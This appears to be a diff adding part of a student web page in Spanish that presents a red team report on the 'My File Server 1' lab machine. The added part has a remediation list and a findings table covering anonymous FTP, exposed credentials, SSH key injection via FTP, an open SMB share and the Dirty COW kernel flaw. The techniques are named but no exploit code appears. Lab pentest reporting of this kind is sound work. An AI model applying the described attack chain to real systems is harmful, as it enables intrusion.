+          </p>
+          <div class="space-y-3">
+            {[
+              {
+                id: "REC-01", nivel: "CRÍTICO", titulo: "Eliminar credenciales expuestas en recursos web",
+                desc: "Eliminar inmediatamente readme.txt accesible en http://192.168.0.8/readme.txt. Implementar política de gestión de contraseñas con rotación periódica y almacenamiento seguro mediante hashing (bcrypt, argon2). Auditar el servidor web en busca de otros archivos con información sensible."
+              },
+              {
+                id: "REC-02", nivel: "CRÍTICO", titulo: "Actualizar el kernel del sistema operativo",
+                desc: "Actualizar el kernel de CentOS desde la versión 3.10.0-229.el7 a la versión parcheada (mínimo 3.10.0-514.6.2.el7 que incluye el parche para CVE-2016-5195). Ejecutar 'yum update kernel'. Establecer proceso de gestión de parches periódico."
+              },
+              {
+                id: "REC-03", nivel: "ALTO", titulo: "Deshabilitar el acceso FTP anónimo",
+                desc: "Modificar /etc/vsftpd/vsftpd.conf para establecer anonymous_enable=NO. Si FTP no es necesario, deshabilitarlo. En caso de requerir transferencia de archivos, migrar a SFTP (subsistema de SSH) o FTPS con certificados válidos."
+              },
+              {
+                id: "REC-04", nivel: "ALTO", titulo: "Restringir permisos del recurso SMB 'smbdata'",
+                desc: "Configurar smbdata para requerir autenticación válida. En /etc/samba/smb.conf agregar 'guest ok = no' y 'valid users = @smbusers'. Habilitar registro de accesos a recursos compartidos para monitoreo."
+              },
+              {
+                id: "REC-05", nivel: "ALTO", titulo: "Restringir escritura en directorios home vía FTP",
+                desc: "Configurar FTP para impedir escritura en directorios sensibles como .ssh. Implementar chroot_local_user=YES en vsftpd. Revisar y revocar las llaves SSH inyectadas durante la evaluación del authorized_keys de smbuser."
+              },
+              {
+                id: "REC-06", nivel: "MEDIO", titulo: "Deshabilitar HTTP TRACE y corregir Apache",
+                desc: "Agregar 'TraceEnable Off' en /etc/httpd/conf/httpd.conf. Actualizar Apache. Configurar cabecera X-Frame-Options. Agregar 'Options -Indexes' para deshabilitar listado de directorios y 'ServerTokens Prod' para minimizar información expuesta."
+              },
+              {
+                id: "REC-07", nivel: "MEDIO", titulo: "Implementar monitoreo y detección de intrusos",
+                desc: "Implementar IDS/IPS como Snort o Suricata. Centralizar logs de FTP, SSH, HTTP y SMB en un SIEM para correlación y análisis. Implementar fail2ban para prevenir ataques de fuerza bruta en servicios de acceso remoto."
+              },
+            ].map(({ id, nivel, titulo, desc }) => (
+              <div class={`p-4 rounded-lg border ${nivel === 'CRÍTICO' ? 'border-red-500/30 bg-gray-900/50' : nivel === 'ALTO' ? 'border-orange-500/30 bg-gray-900/50' : 'border-yellow-500/30 bg-gray-900/50'}`}>
+                <div class="flex items-center gap-2 mb-1 flex-wrap">
+                  <code class="text-gray-400 font-mono text-xs">{id}</code>
+                  <span class={`px-2 py-0.5 rounded text-xs font-bold ${nivel === 'CRÍTICO' ? 'bg-red-600/20 text-red-400' : nivel === 'ALTO' ? 'bg-orange-600/20 text-orange-400' : 'bg-yellow-600/20 text-yellow-400'}`}>{nivel}</span>
+                  <span class="font-semibold text-gray-200 text-sm">{titulo}</span>
+                </div>
+                <p class="text-gray-400 text-xs">{desc}</p>
+              </div>
+            ))}
+          </div>
+        </div>
+
+        {/* ── 10. TABLA DE HALLAZGOS ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">10. Tabla de Hallazgos</h3>
+          <p class="text-sm text-gray-400 mb-4">
+            Resumen consolidado de las siete vulnerabilidades identificadas durante la evaluación.
+          </p>
+          <div class="overflow-x-auto rounded-lg border border-gray-700">
+            <table class="w-full text-xs">
+              <thead>
+                <tr class="bg-gray-900/80 border-b border-gray-700">
+                  <th class="px-3 py-2.5 text-left text-gray-300 font-semibold">ID</th>
+                  <th class="px-3 py-2.5 text-left text-gray-300 font-semibold">Vulnerabilidad</th>
+                  <th class="px-3 py-2.5 text-left text-gray-300 font-semibold">Puerto</th>
+                  <th class="px-3 py-2.5 text-left text-gray-300 font-semibold">Severidad</th>
+                  <th class="px-3 py-2.5 text-left text-gray-300 font-semibold">Impacto</th>
+                  <th class="px-3 py-2.5 text-left text-gray-300 font-semibold">Recomendación</th>
+                </tr>
+              </thead>
+              <tbody>
+                {[
+                  { id: "V-01", vuln: "Acceso FTP Anónimo (vsftpd 3.0.2)", puerto: "21/tcp", sev: "ALTA", impacto: "Exfiltración de archivos y escritura remota", rec: "Deshabilitar FTP anónimo en vsftpd.conf" },
+                  { id: "V-02", vuln: "Credenciales expuestas en readme.txt", puerto: "HTTP/80", sev: "CRÍTICA", impacto: "Acceso autenticado a FTP y SSH", rec: "Eliminar archivo. Implementar política de contraseñas" },
+                  { id: "V-03", vuln: "SMB smbdata R/W sin autenticación", puerto: "445/tcp", sev: "ALTA", impacto: "Manipulación de archivos compartidos", rec: "guest ok=no; restringir permisos con valid users" },
+                  { id: "V-04", vuln: "HTTP TRACE habilitado (Apache 2.4.6)", puerto: "80/tcp", sev: "MEDIA", impacto: "Cross-Site Tracing (XST)", rec: "TraceEnable Off en httpd.conf" },
+                  { id: "V-05", vuln: "Directory Indexing activo Apache", puerto: "80/tcp", sev: "MEDIA", impacto: "Exposición de estructura de directorios", rec: "Options -Indexes en configuración de Apache" },
+                  { id: "V-06", vuln: "SSH inyectable vía FTP (authorized_keys)", puerto: "21/tcp", sev: "ALTA", impacto: "Acceso persistente sin contraseña al servidor", rec: "chroot_local_user=YES. Revocar llaves inyectadas" },
+                  { id: "V-07", vuln: "Kernel vulnerable a Dirty COW (CVE-2016-5195)", puerto: "local", sev: "CRÍTICA", impacto: "Compromiso total del sistema (root)", rec: "yum update kernel ≥ 3.10.0-514.6.2.el7" },
+                ].map(({ id, vuln, puerto, sev, impacto, rec }) => (
+                  <tr class="border-b border-gray-700/50 last:border-0 hover:bg-gray-800/30 transition-colors">
+                    <td class="px-3 py-2.5 font-mono text-gray-400">{id}</td>
+                    <td class="px-3 py-2.5 text-gray-200">{vuln}</td>
+                    <td class="px-3 py-2.5 font-mono text-yellow-400">{puerto}</td>
+                    <td class="px-3 py-2.5">
+                      <span class={`px-2 py-0.5 rounded font-bold ${sev === 'CRÍTICA' ? 'bg-red-600/20 text-red-400' : sev === 'ALTA' ? 'bg-orange-600/20 text-orange-400' : 'bg-yellow-600/20 text-yellow-400'}`}>{sev}</span>
+                    </td>
+                    <td class="px-3 py-2.5 text-gray-400">{impacto}</td>
+                    <td class="px-3 py-2.5 text-gray-400">{rec}</td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        {/* ── EVIDENCIA VISUAL ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-4 text-blue-500/80">Evidencia Visual</h3>
+          <figure class="relative transition-all duration-300 hover:scale-[1.01]">
+            <img
+              class="w-full rounded-xl shadow-lg border border-gray-200 dark:border-gray-800"
+              src={INFO_TAREA.imagen}
+              alt="Evidencia visual de la actividad 9 - Red Team Report My File Server 1"
+            />
+            <figcaption class="mt-2 text-center text-sm text-gray-500 italic">
+              Figura 1: Evidencia del proceso de pentesting — My File Server 1.
+            </figcaption>
+          </figure>
+        </div>
+
+      </div>
+
+      {/* --- ZONA DE DESCARGA Y NAVEGACIÓN --- */}
+      <div class="mt-16 pt-8 border-t border-gray-200 dark:border-gray-800 flex flex-col items-center gap-6">
+        <a
+          href={INFO_TAREA.pdf}
+          download="actividad09-Equipo5.pdf"
+          class="flex items-center gap-2 px-8 py-3 text-base font-bold text-white transition-all bg-blue-600 rounded-full hover:bg-blue-700 hover:shadow-lg hover:shadow-blue-500/30"
+        >
+          <Link class="size-5" />
+          Descargar PDF de la Tarea
+        </a>
+        <a
+          href="/#tareas"
+          class="text-gray-500 hover:text-blue-500 hover:underline flex items-center gap-2 text-sm font-medium transition mt-4"
+        >
+          ← Regresar a la lista de tareas
+        </a>
+      </div>
+
+    </SectionContainer>
+  </main>
+</Layout>
